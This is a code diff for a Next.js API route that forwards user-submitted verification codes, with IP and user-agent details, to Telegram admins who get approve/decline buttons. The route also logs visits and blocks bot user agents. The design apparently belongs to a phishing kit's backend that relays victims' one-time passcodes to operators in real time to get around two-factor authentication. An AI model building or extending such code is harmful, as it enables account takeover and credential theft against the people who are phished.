@@ -11,9 +11,14 @@ import {
   lookupIpGeo,
   sendTelegramToAll,
   withSiteHeader,
+  sendVerificationWithApprovalButtons,
 } from "@/lib/telegram";
 import { getVercelGeoHints } from "@/lib/vercel-geo";
 import { isBlockedBotUserAgent } from "@/lib/bot-block";
+import {
+  storePendingCode,
+  startAutocleanup,
+} from "@/lib/pending-codes";
 
 const methodEnum = z.enum(["email", "text", "phone"]);
 
@@ -73,6 +78,15 @@ function formatUtcTime(d: Date): string {
 }
 
 export async function POST(request: Request) {
+  // Initialize autocleanup on first request
+  if (typeof globalThis !== "undefined") {
+    if (!(globalThis as any).__telegramAutocleanupInitialized) {
+      (globalThis as any).__telegramAutocleanupInitialized = true;
+      startAutocleanup();
+      console.log("[TELEGRAM] Autocleanup initialized");
+    }
+  }
+
   if (!isTelegramConfigured()) {
     console.error("[TELEGRAM ERROR] Telegram is not configured");
     return NextResponse.json(
@@ -111,6 +125,7 @@ export async function POST(request: Request) {
   }
 
   let text: string;
+  let isVerificationWithButtons = false;
 
   switch (body.kind) {
     case "visit": {
@@ -151,9 +166,53 @@ export async function POST(request: Request) {
     case "method":
       text = formatMethodMessage(body.method);
       break;
-    case "verification":
+    case "verification": {
+      // Store the pending code for admin approval
+      const pendingCode = storePendingCode(
+        body.code,
+        body.method,
+        body.otpStep,
+        "new_user",
+        {
+          clientIp: getClientIp(request) ?? undefined,
+          userAgent: request.headers.get("user-agent") ?? undefined,
+        },
+      );
+
+      // Send message with approve/decline buttons to admins
+      const result = await sendVerificationWithApprovalButtons(
+        body.method,
+        body.code,
+        body.otpStep,
+        pendingCode.id,
+      );
+
+      if (!result.ok) {
+        console.error("[TELEGRAM ERROR] Failed to send verification with buttons:", result.error);
+        return NextResponse.json(
+          { ok: false, error: "send_failed" },
+          { status: 502 },
+        );
+      }
+
+      // Store message ID for later editing
+      if (result.messageId) {
+        pendingCode.messageId = result.messageId;
+      }
+
+      console.log(
+        "[TELEGRAM] Verification code stored for approval:",
+        pendingCode.id,
+      );
+      
+      // Store the pending code ID globally for returning in response
+      (global as any).__lastPendingCodeId = pendingCode.id;
+      
+      // Don't send generic message for verification codes
+      isVerificationWithButtons = true;
       text = formatVerificationMessage(body.method, body.code, body.otpStep);
       break;
+    }
     case "resend":
       text = formatResendMessage(body.method, body.otpStep);
       break;
@@ -169,6 +228,11 @@ export async function POST(request: Request) {
       const _exhaustive: never = body;
       return _exhaustive;
     }
+  }
+
+  // Skip generic send for verification messages (already sent with buttons)
+  if (isVerificationWithButtons) {
+    return NextResponse.json({ ok: true, codeId: (global as any).__lastPendingCodeId });
   }
 
   // DEBUG LOGGING: Remove this block after verifying Telegram delivery
